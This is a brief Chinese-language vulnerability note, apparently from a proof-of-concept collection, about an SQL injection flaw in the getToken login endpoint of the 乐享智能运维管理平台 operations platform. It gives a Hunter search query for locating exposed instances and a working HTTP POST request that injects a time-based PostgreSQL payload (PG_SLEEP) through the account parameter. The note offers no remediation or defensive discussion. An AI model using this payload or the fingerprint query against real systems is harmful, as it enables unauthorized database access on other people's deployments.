# 乐享智能运维管理平台getToken存在SQL注入漏洞

乐享智能运维管理平台getToken存在SQL注入漏洞

## hunter

```yaml
title="乐享智能运维管理平台"
```

## poc

```java
POST /auth-ui/v1/api/user/token/getToken HTTP/1.1

account=admin');SELECT PG_SLEEP(5)--&password=6e0f9e14344c5406a0cf5a3b4dfb665f87f4a771a31f7edbb5c72874a32b2957
```

